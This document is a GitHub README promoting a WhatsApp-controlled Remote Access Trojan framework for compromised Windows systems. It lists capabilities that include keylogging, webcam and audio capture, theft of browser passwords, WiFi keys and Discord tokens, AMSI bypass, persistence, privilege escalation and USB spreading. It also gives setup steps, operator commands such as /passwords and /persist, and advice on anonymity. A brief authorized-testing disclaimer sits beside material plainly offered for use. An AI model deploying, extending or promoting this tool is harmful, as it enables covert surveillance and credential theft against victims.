# T0OL-B4S3-263

> Ultimate WhatsApp RAT Control System with Modern Hacker Aesthetics

![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen)
![Version](https://img.shields.io/badge/Version-1.0.0-blue)
![License](https://img.shields.io/badge/License-MIT-red)

---

## 🎯 Overview

T0OL-B4S3-263 is a sophisticated Remote Access Trojan (RAT) framework providing multi-interface control of compromised Windows systems through:

- **WhatsApp Bot** - User-friendly command interface
- **Terminal C2** - Direct command execution  
- **HTTP API** - REST interface for integration

### Key Features

✅ **Real-time Surveillance**
- Screen capture (MSS)
- Webcam monitoring (OpenCV)
- Keystroke logging
- Audio recording
- Clipboard monitoring

✅ **Credential Harvesting**
- Browser passwords (Chrome, Edge, Firefox)
- WiFi network credentials
- Discord tokens
- Browser history

✅ **System Control**
- Process management
- System information gathering
- Performance metrics
- Network scanning
- Geolocation tracking

✅ **Advanced Capabilities**
- Persistence mechanisms
- Privilege escalation
- Defense evasion (AMSI bypass)
- Ransomware simulation
- USB spreading

✅ **Multi-Session Management**
- Handle multiple targets simultaneously
- Thread-safe session management
- Non-blocking operations
- Automatic reconnection

---

## 🚀 Quick Start

### Prerequisites

- **Node.js** ≥ 18.0.0
- **npm** ≥ 9.0.0
- **WhatsApp Account** with phone number
- **Internet Connection**

### Installation

```bash
# 1. Clone repository
git clone https://github.com/ksm-zw/Claude-Shell-2.git
cd Claude-Shell-2/whatsapp-c2

# 2. Install dependencies
npm install

# 3. Run setup wizard
node setup.js

# 4. Start bot
npm start
```

### Configuration

The setup wizard (`setup.js`) guides you through:

1. **RAT Server Setup** - C2 host and port
2. **WhatsApp Configuration** - Bot name and owner numbers
3. **Encryption** - Automatic key generation
4. **Features** - Enable/disable optional capabilities

Generated files:
- `config.json` - Main configuration
- `.env` - Environment variables
- `.env.example` - Template for reference

---

## 📖 Command System

### Main Categories

```
📸 SURVEILLANCE    - Screen, webcam, audio, keylogger, clipboard
🔐 CREDENTIALS    - Passwords, WiFi, Discord, browser history
⚙️  SYSTEM        - Info, processes, metrics, software, network
🎮 ADVANCED       - Message box, beep, lock, shutdown, persist
```

### Getting Help

```
/help              - Main menu with all commands (50+)
/help -category    - Commands in specific category
/help -command     - Detailed help for command

Examples:
/help -surveillance
/help -screenshot
```

### Example Commands

```bash
# Session management
/sessions          # List active sessions
/use 1             # Switch to session 1

# Surveillance
/screenshot        # Capture screen
/webcam           # Capture webcam
/record 10        # Record 10 seconds of audio
/keylogs          # Get keystroke logs

# Credentials
/passwords        # Extract browser passwords
/wifi             # Get WiFi passwords
/discord          # Steal Discord tokens

# System info
/sysinfo          # System information
/processes        # Running processes
/metrics          # CPU/RAM/Disk usage
/software         # Installed programs

# Advanced
/msgbox "Hello"   # Display message box
/lock             # Lock workstation
/shutdown         # Shutdown system
/persist          # Install persistence
```

---

## 📁 Project Structure

```
Claude-Shell-2/
├── whatsapp-c2/                 # WhatsApp bot (Node.js)
│   ├── bot.js                   # Main bot application
│   ├── setup.js                 # Interactive setup wizard
│   ├── config.json              # Configuration file
│   ├── package.json             # Dependencies
│   ├── commands/                # Command modules
│   │   ├── surveillance.js      # Screen, webcam, audio
│   │   ├── credentials.js       # Passwords, tokens
│   │   ├── system.js            # System information
│   │   └── fun.js               # Advanced features
│   └── utils/                   # Helper utilities
│       ├── ratClient.js         # C2 communication
│       ├── formatter.js         # Response formatting
│       ├── commandMetadata.js   # Command definitions
│       └── helpHandler.js       # Help system
│
├── rat_ultimate.py              # Windows RAT payload
├── rat_server_fixed.py          # C2 server (port 4444)
├── rat_api_bridge.py            # HTTP API bridge
│
├── README.md                    # This file
├── SETUP_GUIDE.md              # Detailed setup guide
├── CONFIG_REFERENCE.md         # Configuration reference
└── requirements.txt            # Python dependencies
```

---

## 🔒 Security

### Encryption

- **Method**: Fernet (AES) symmetric encryption
- **Key Management**: Auto-generated, stored in `.env`
- **Communication**: All C2 traffic encrypted

### Best Practices

1. ✅ Change default encryption key after setup
2. ✅ Restrict owner numbers to authorized users
3. ✅ Use VPN/Proxy for anonymity
4. ✅ Keep `.env` and `config.json` confidential
5. ✅ Run on isolated, secure network only
6. ✅ Monitor logs for suspicious activity
7. ✅ Update dependencies regularly (`npm audit`)

### Warnings

⚠️ **LEGAL NOTICE**  
This tool is designed for authorized security testing and authorized targets only. Unauthorized access to computer systems is illegal. Users are responsible for compliance with all applicable laws.

---

## 🛠️ Technology Stack

### Backend (Bot)
- **Framework**: Baileys (WhatsApp Web automation)
- **Runtime**: Node.js
- **Encryption**: cryptography/fernet
- **CLI**: chalk (colorized output)

### Communication
- **Protocol**: Socket (TCP)
- **Encryption**: Fernet (AES)
- **Serialization**: JSON

### RAT Framework (Optional)
- **Language**: Python 3
- **Surveillance**: MSS, OpenCV, PyAudio, pynput
- **Evasion**: AMSI bypass, sandbox detection
- **Persistence**: Registry, startup folders

---

## 📚 Documentation

- **[SETUP_GUIDE.md](SETUP_GUIDE.md)** - Complete setup instructions
- **[CONFIG_REFERENCE.md](CONFIG_REFERENCE.md)** - Configuration options
- **[bot.js](whatsapp-c2/bot.js)** - Main bot source code
- **[commandMetadata.js](whatsapp-c2/utils/commandMetadata.js)** - Command definitions

---

## 🐛 Troubleshooting

### Bot Won't Start

```bash
# Reinstall dependencies
rm -rf node_modules package-lock.json
npm install

# Re-run setup
node setup.js

# Check logs
npm start
```

### Connection Issues

- Verify C2 server is running on configured host/port
- Check firewall rules allow port 4444
- Verify encryption key matches server config

### Commands Not Working

```bash
# Make sure session is active
/sessions
/use 1

# Check help for correct syntax
/help -command
```

For more troubleshooting, see [SETUP_GUIDE.md#troubleshooting](SETUP_GUIDE.md#troubleshooting).

---

## 📊 Architecture

```
┌─────────────────────────────────────────┐
│     WhatsApp Bot (Node.js)              │
└──────────────────┬──────────────────────┘
                   │
           ┌───────▼────────┐
           │  RATClient     │
           │  (Encrypted)   │
           └───────┬────────┘
                   │
┌──────────────────▼──────────────────────┐
│   C2 Server (Python) Port 4444          │
│   Session Management                    │
└──────────────────┬──────────────────────┘
                   │
        ┌──────────┼──────────┐
        │          │          │
    [Target1]  [Target2]  [TargetN]
     RAT.exe    RAT.exe     RAT.exe
```

**Flow**: WhatsApp → Bot → RATClient → C2 Server → Target Payload

---

## 💡 Advanced Usage

### Custom Commands

Add new commands by creating handlers in `commands/` directory:

```javascript
export class CustomCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  async myCommand(chatId, sessionId) {
    const result = await this.ratClient.sendCommand(sessionId, 'custom');
    await this.sock.sendMessage(chatId, { text: result });
  }
}
```

### Database Logging

Store command logs:

```javascript
// In bot.js
const db = require('mongodb');
// Add logging for each command execution
```

### Webhook Notifications

Send alerts on command execution:

```bash
# Set webhook URL in config.json
"webhookUrl": "https://your-server.com/webhook"
```

---

## 🚨 Disclaimer

This software is provided for **authorized security testing and educational purposes only**. Users are responsible for:

- ✅ Obtaining written authorization before testing
- ✅ Complying with all applicable laws and regulations
- ✅ Using only on systems you own or have permission to test
- ✅ Understanding legal implications in your jurisdiction

**Unauthorized access to computer systems is illegal.**

---

## 📄 License

MIT License - See LICENSE file for details

---

## 👤 Author

**Hxcker-263**

- GitHub: [@ksm-zw](https://github.com/ksm-zw)
- Status: Security Researcher

---

## 🙏 Acknowledgments

- Baileys - WhatsApp Web automation library
- MSS - Screen capture
- OpenCV - Computer vision
- cryptography - Encryption library

---

## 📞 Support

For issues and questions:

1. Check [SETUP_GUIDE.md#troubleshooting](SETUP_GUIDE.md#troubleshooting)
2. Review [CONFIG_REFERENCE.md](CONFIG_REFERENCE.md)
3. Check bot logs in `logs/` directory
4. Open GitHub issue with details

---

**Latest Update**: December 8, 2025  
**Version**: 1.0.0  
**Status**: ✅ Production Ready

---

<div align="center">

Made with ❤️ for security professionals

[⭐ Star on GitHub](https://github.com/ksm-zw/Claude-Shell-2) • [📖 Documentation](SETUP_GUIDE.md) • [🐛 Report Bug](https://github.com/ksm-zw/Claude-Shell-2/issues)

</div>
